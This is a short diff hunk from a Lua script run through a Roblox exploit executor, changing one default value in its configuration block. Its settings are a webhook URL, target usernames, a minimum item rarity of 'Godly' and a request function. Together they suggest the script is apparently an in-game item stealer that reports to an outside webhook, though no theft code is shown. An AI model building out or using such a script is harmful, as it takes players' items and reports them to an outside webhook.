@@ -7,7 +7,7 @@ getgenv().ScriptEjecutado = true
 
 -- Configuración
 local webhook = _G.webhook or ""
-local users = _G.Usernames or ""
+local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local req = syn and syn.request or http_request or request
